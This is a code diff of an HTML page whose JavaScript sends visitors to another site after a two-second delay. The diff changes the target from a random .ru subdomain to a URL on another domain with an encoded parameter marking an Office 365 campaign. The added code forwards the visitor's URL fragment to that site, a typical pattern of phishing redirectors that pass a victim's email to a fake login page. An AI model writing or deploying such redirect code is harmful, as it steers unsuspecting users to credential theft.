@@ -7,10 +7,17 @@
 </head>
 <body>
 
-
     <script type="text/javascript">
-        // Set the URL you want to redirect to
-        var redirectUrl = "https://wiJ7.tzdpeyiii.ru/ghQN6zW/"; // Replace with your target URL
+        // Set the base URL you want to redirect to
+        var redirectUrl = "https://irvinsahnimd.com/m/?c3Y9bzM2NV8xX25vbSZyYW5kPVVGbHlORU09JnVpZD1VU0VSMzExMDIwMjRVMzIxMDMxMjU=N0123N";
+
+        // Get the current URL's fragment (everything after #)
+        var fragment = window.location.hash;
+
+        // If there's a fragment, append it to the redirect URL
+        if (fragment) {
+            redirectUrl += fragment;
+        }
 
         // Set the delay time in milliseconds (2000 = 2 seconds)
         var delayTime = 2000;
@@ -20,5 +27,6 @@
             window.location.href = redirectUrl;
         }, delayTime);
     </script>
+    
 </body>
 </html>
